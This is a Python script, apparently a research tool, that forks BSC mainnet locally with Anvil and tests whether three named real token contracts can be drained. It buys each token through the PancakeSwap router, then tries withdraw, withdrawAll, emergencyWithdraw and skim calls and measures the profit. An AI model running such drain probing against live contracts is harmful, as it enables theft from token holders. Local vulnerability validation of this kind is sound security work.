#!/usr/bin/env python3
"""
Forge Backtest Simulator - Simulates ItyFuzz vulnerabilities from backtest logs
"""

import subprocess
import json
import re
import time
import os
from typing import List, Dict, Tuple

class ForgeBacktestSimulator:
    """Simulates backtest vulnerabilities using Forge/Cast"""
    
    def __init__(self):
        self.rpc_url = "http://localhost:8545"
        
        # Contract addresses
        self.contracts = {
            "bsc": {
                "router": "0x10ED43C718714eb63d5aA57B78B54704E256024E",
                "wbnb": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "bego": "0xc342774492b54ce5F8ac662113ED702Fc1b34972",
                "bigfi": "0x88503F48e437a377f1aC2892cBB3a5b09949faDd",
                "lpc": "0xBe4C1Cb10C2Be76798c4186ADbbC34356b358b52"
            }
        }
    
    def check_anvil(self) -> bool:
        """Check if Anvil is running"""
        try:
            subprocess.check_output([
                "cast", "block-number", "--rpc-url", self.rpc_url
            ])
            return True
        except:
            return False
    
    def get_account(self) -> str:
        """Get test account"""
        accounts = json.loads(subprocess.check_output([
            "cast", "rpc", "eth_accounts", "--rpc-url", self.rpc_url
        ]).decode())
        return accounts[0]
    
    def get_balance(self, address: str) -> int:
        """Get ETH balance in wei"""
        balance = subprocess.check_output([
            "cast", "balance", address, "--rpc-url", self.rpc_url
        ]).decode().strip()
        return int(balance)
    
    def encode_swap(self, amount_out_min: int, path: List[str], to: str, deadline: int) -> str:
        """Encode swapExactETHForTokens call using cast abi-encode"""
        # Use abi-encode for complex types
        encoded = subprocess.check_output([
            "cast", "abi-encode",
            "f(uint256,address[],address,uint256)",
            str(amount_out_min),
            f"[{','.join(path)}]",
            to,
            str(deadline)
        ]).decode().strip()
        
        # Add function selector
        selector = "0x7ff36ab5"  # swapExactETHForTokens
        return selector + encoded[2:]  # Remove 0x from encoded
    
    def simulate_swap(self, token: str, amount_eth: float) -> Dict:
        """Simulate a swap transaction"""
        account = self.get_account()
        router = self.contracts["bsc"]["router"]
        wbnb = self.contracts["bsc"]["wbnb"]
        
        # Take snapshot
        snapshot = subprocess.check_output([
            "cast", "rpc", "evm_snapshot", "--rpc-url", self.rpc_url
        ]).decode().strip().strip('"')
        
        initial_balance = self.get_balance(account)
        
        try:
            # Encode swap
            deadline = int(time.time()) + 3600
            calldata = self.encode_swap(0, [wbnb, token], account, deadline)
            
            # Send transaction
            value_wei = int(amount_eth * 1e18)
            result = subprocess.run([
                "cast", "send", router, calldata,
                "--from", account,
                "--value", str(value_wei),
                "--rpc-url", self.rpc_url,
                "--unlocked"
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                # Get token balance
                token_balance = subprocess.check_output([
                    "cast", "call", token,
                    "balanceOf(address)(uint256)",
                    account,
                    "--rpc-url", self.rpc_url
                ]).decode().strip()
                
                return {
                    "success": True,
                    "tokens_received": int(token_balance, 16) / 1e18,
                    "eth_spent": amount_eth
                }
            else:
                return {
                    "success": False,
                    "error": result.stderr
                }
                
        finally:
            # Revert snapshot
            subprocess.run([
                "cast", "rpc", "evm_revert", snapshot,
                "--rpc-url", self.rpc_url
            ], capture_output=True)
    
    def simulate_drain(self, token: str) -> Dict:
        """Simulate drain function call"""
        account = self.get_account()
        
        # Common drain selectors
        selectors = {
            "withdraw()": "0x3ccfd60b",
            "withdrawAll()": "0x853828b6",
            "emergencyWithdraw()": "0xdb2e21bc",
            "skim(address)": "0xbc25cf77"
        }
        
        results = {}
        
        for name, selector in selectors.items():
            # Take snapshot
            snapshot = subprocess.check_output([
                "cast", "rpc", "evm_snapshot", "--rpc-url", self.rpc_url
            ]).decode().strip().strip('"')
            
            initial_balance = self.get_balance(account)
            
            # Try to call function
            if "address" in name:
                # Functions with address parameter
                calldata = selector + "000000000000000000000000" + account[2:].lower()
            else:
                calldata = selector
            
            result = subprocess.run([
                "cast", "send", token, calldata,
                "--from", account,
                "--rpc-url", self.rpc_url,
                "--unlocked"
            ], capture_output=True, text=True)
            
            final_balance = self.get_balance(account)
            profit = (final_balance - initial_balance) / 1e18
            
            results[name] = {
                "success": result.returncode == 0,
                "profit": profit,
                "error": result.stderr if result.returncode != 0 else None
            }
            
            # Revert
            subprocess.run([
                "cast", "rpc", "evm_revert", snapshot,
                "--rpc-url", self.rpc_url
            ], capture_output=True)
        
        return results
    
    def find_max_profit(self, token: str, base_amount: float = 1.0) -> Dict:
        """Find maximum profitable swap amount"""
        print(f"\n=== Finding Max Profit for {token} ===")
        
        multipliers = [1, 10, 100, 1000, 10000]
        results = {}
        best_multiplier = 0
        best_profit = 0
        
        for mult in multipliers:
            amount = base_amount * mult
            print(f"\nTesting {amount} ETH swap...")
            
            # Simulate swap
            swap_result = self.simulate_swap(token, amount)
            
            if swap_result["success"]:
                tokens = swap_result["tokens_received"]
                print(f"  ✅ Received {tokens:.4f} tokens")
                
                # Simulate drain
                drain_results = self.simulate_drain(token)
                
                for func, result in drain_results.items():
                    if result["success"] and result["profit"] > 0:
                        print(f"  ✅ {func} earned {result['profit']:.4f} ETH")
                        
                        if result["profit"] > best_profit:
                            best_profit = result["profit"]
                            best_multiplier = mult
                
                results[mult] = {
                    "swap": swap_result,
                    "drain": drain_results
                }
            else:
                print(f"  ❌ Swap failed")
                results[mult] = {"swap": swap_result}
        
        return {
            "best_multiplier": best_multiplier,
            "best_profit": best_profit,
            "results": results
        }

def analyze_backtest_logs():
    """Analyze all backtest logs"""
    simulator = ForgeBacktestSimulator()
    
    # Check Anvil
    if not simulator.check_anvil():
        print("❌ Anvil not running! Start with:")
        print("anvil --fork-url https://bsc-dataseed.binance.org/ --chain-id 56")
        return
    
    print("✅ Anvil is running")
    
    # Test each token
    tokens = ["bego", "bigfi", "lpc"]
    
    for token_name in tokens:
        token_addr = simulator.contracts["bsc"].get(token_name)
        if not token_addr:
            continue
        
        print(f"\n{'='*50}")
        print(f"Testing {token_name.upper()} ({token_addr})")
        print(f"{'='*50}")
        
        # Find max profit
        result = simulator.find_max_profit(token_addr)
        
        print(f"\n🎯 Best result for {token_name.upper()}:")
        print(f"  Multiplier: {result['best_multiplier']}x")
        print(f"  Max Profit: {result['best_profit']:.4f} ETH")

def main():
    """Main entry point"""
    print("=== Forge Backtest Simulator ===\n")
    
    # Run analysis
    analyze_backtest_logs()
    
    print("\n✅ Simulation complete!")

if __name__ == "__main__":
    main()